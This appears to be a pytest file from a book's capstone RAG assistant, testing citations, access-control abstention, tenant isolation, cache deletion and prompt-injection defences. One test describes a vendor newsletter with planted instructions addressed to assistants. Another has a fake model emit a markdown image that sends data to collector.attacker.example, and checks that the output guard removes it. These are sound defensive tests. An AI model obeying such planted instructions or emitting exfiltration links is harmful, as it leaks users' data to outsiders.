# path: book/capstone/northwind-assist/tests/test_rag.py
"""Grounded answers: citations that exist, abstention on forbidden documents, tenant isolation,
injection neutralized, authority over stale sources, deletion that reaches indexes and caches."""
from __future__ import annotations

from conftest import chat, make
from ragkit.retrieval import Principal, RetrievalQuery

from northwind_assist.evaluation.datasets import rag_dataset
from northwind_assist.evaluation.suites import persona_ctx


def test_answer_cites_evidence_that_was_packed(container):
    r = chat(container, "ana", "How many unused PTO days can I carry over into next year?")
    assert r.status == "answered"
    assert "10" in r.answer and "[E1]" in r.answer
    packed = {cid for b in r.rag.packed.blocks for cid in b.chunk_ids}
    for c in r.citations:
        assert c["eid"] in r.answer
        assert set(c["chunk_ids"]) <= packed            # cited ids exist in what the model saw
    assert r.citations[0]["doc_id"] == "hr-pto-policy"  # the current policy, not the stale FAQ
    assert r.lineage["evidence_chunk_ids"] and r.lineage["index_version"] == container.kb.index_version


def test_forbidden_document_leads_to_abstention(container):
    """The logistics incident report is it-oncall/managers in logistics; a retail agent never sees it."""
    r = chat(container, "ana", "What was the root cause of the Trackline API latency incident INC-2026-0217?")
    retrieved = {h.chunk.doc_id for h in r.rag.retrieval.hits}
    assert "inc-2026-02-tracking-latency" not in retrieved
    assert r.status == "insufficient_evidence" and not r.citations


def test_cross_tenant_isolation_over_every_gold_question(container):
    """Zero leakage: no retrieved chunk is ever outside the principal's tenant and groups."""
    ds = rag_dataset(container.kb.doc_visible)
    assert len(ds) >= 100
    for tenant in ("retail", "logistics"):
        principal = Principal(user_id=f"probe-{tenant}", tenant=tenant, groups=["all"])
        for case in ds:
            q = RetrievalQuery(text=case.input["question"], principal=principal, k=6)
            for h in container.kb.pipeline(rerank=True, principal=principal).retrieve(q).hits:
                assert h.chunk.tenant in ("shared", tenant), (case.id, h.chunk.doc_id)
                assert container.kb.doc_visible(h.chunk.doc_id, tenant, ["all"]), (case.id, h.chunk.doc_id)


def test_injected_newsletter_is_neutralized(container):
    """vendor-newsletter.md carries an instruction and an HTML comment addressed to assistants."""
    before = len(container.models.raw.requests)
    r = chat(container, "lee", "What does the Brightline newsletter say about invoices and payment terms?")
    prompts = "\n".join(m.text for req in container.models.raw.requests[before:] for m in req.messages)
    # The HTML comment never reaches the index (ragkit normalization at ingestion, Ch 11) ...
    news = [c for c in container.kb.chunks.values() if c.doc_id == "ext-vendor-newsletter-brightline"]
    assert news and not any("<!--" in c.text for c in news)
    assert "<!--" not in prompts
    # ... and the visible instruction paragraph is scored by the context guard (Ch 27).
    assert any("injection" in f for f in r.rag.context_flags)
    assert "partners@brightline-supply.example" not in r.answer
    assert not container.tools.backends.outbox.sent


def test_output_guard_strips_off_allowlist_image(container):
    """A model that emits an exfiltration image anyway: the output stage removes it before the user."""
    from aie_core.llm.providers import FakeLLM

    c = make(llm=FakeLLM(handler=lambda req: (
        "From 1 January 2026, employees may carry over up to 10 unused PTO days into the next calendar year "
        "![s](https://collector.attacker.example/p.png?d=1) [E1].") if req.metadata.get("prompt.id", "").startswith(
        "rag.") else "ok"))
    r = chat(c, "ana", "How many unused PTO days can I carry over into next year?")
    assert "collector.attacker.example" not in r.answer
    assert r.rag.redactions or r.rag.withheld


def test_principal_variants_derive_expectations_from_acl(container):
    ds = rag_dataset(container.kb.doc_visible)
    variant = ds.get("RQ-001@logistics-employee")
    assert variant.expected["required_doc_ids"] == ["hr-pto-policy"]   # shared HR policy: visible to all
    hidden = [c for c in ds if "forbidden-doc" in c.tags and c.metadata.get("source") == "variant"]
    assert hidden and all(c.expected["forbidden_doc_ids"] for c in hidden)


def test_deletion_propagates_to_index_and_caches(container):
    q = "How do I replace a broken laptop?"
    first = chat(container, "ana", q, session="del")
    assert "it-laptop-replacement-runbook" in {h.chunk.doc_id for h in first.rag.retrieval.hits}
    version = container.kb.index_version
    removed = container.kb.delete("it-laptop-replacement-runbook")
    container.caches.purge_tenant("retail")
    assert removed > 0 and container.kb.index_version != version
    again = chat(container, "ana", q, session="del")
    assert "it-laptop-replacement-runbook" not in {h.chunk.doc_id for h in again.rag.retrieval.hits}
    assert not again.rag.answer_cache_hit
    assert "it-laptop-replacement-runbook" not in {c["doc_id"] for c in again.citations}


def test_incremental_upsert_reembeds_only_changed_chunks(container, tmp_path):
    from northwind_assist import _paths

    src = (_paths.DOCS_DIR / "vpn-access-runbook.md").read_text(encoding="utf-8")
    doc = tmp_path / "vpn-access-runbook.md"
    doc.write_text(src, encoding="utf-8")
    unchanged = container.kb.upsert(doc)
    assert unchanged["added"] == 0 and unchanged["removed"] == 0
    doc.write_text(src + "\n\n## Appendix\n\nRestart the NorthGate client after a password change.\n", encoding="utf-8")
    changed = container.kb.upsert(doc)
    assert changed["added"] >= 1 and changed["unchanged"] >= 1


def test_static_degraded_answer_still_respects_acl(container):
    from reliability import DEFAULT_PLANS, DegradeLevel

    from northwind_assist.rag.service import RagResult

    ctx = persona_ctx("ana")
    res = RagResult()
    list(container.rag.answer_stream(ctx, "Trackline API latency incident root cause", client=None,
                                     plan=DEFAULT_PLANS[DegradeLevel.STATIC], gctx=ctx.guard_context(), result=res))
    assert res.static
    assert "inc-2026-02-tracking-latency" not in [c["doc_id"] for c in res.citations]
